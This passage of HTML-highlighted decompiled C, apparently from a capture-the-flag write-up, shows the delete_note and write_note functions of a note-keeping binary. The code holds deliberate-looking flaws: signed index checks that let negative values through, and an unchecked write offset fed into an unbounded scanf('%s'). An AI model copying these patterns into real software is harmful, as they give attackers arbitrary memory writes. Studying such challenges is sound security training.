style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v1 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x141d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1422\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1428 - 0x1546\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> delete_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1430\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-20, 0x143f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ENTER INDEX: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%1d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    getchar\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1428\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v2 \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x14a3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! INVALID NOTE INDEX !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1530;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x148e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g6) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x14b9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            free\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g5));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x14dd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v5 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g5) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v5 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g6) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C; BACK\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1530;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x14a3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! INVALID NOTE INDEX !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1530;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  lab_0x1530:;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x153d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v1 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x153f\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x1544\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x1546 - 0x168e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> write_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x154e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-28, 0x155d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-24, 0x1564\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ENTER NOTE INDEX: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%3d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v4;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1546\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v2 \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x15c4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! INVALID NOTE INDEX !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1678;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v5 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g6);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x15bd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v5 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x15dd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"ENTER WRITE INDEX: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%ld\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"ENTER DATA: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v6 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g5);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1633\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> **\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(v3 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v6));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C; BACK\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1678;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x15c4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! INVALID NOTE INDEX !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v4 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            goto\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lab_0x1678;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  lab_0x1678:;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v4;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1685\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v1 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x1687\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x168c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 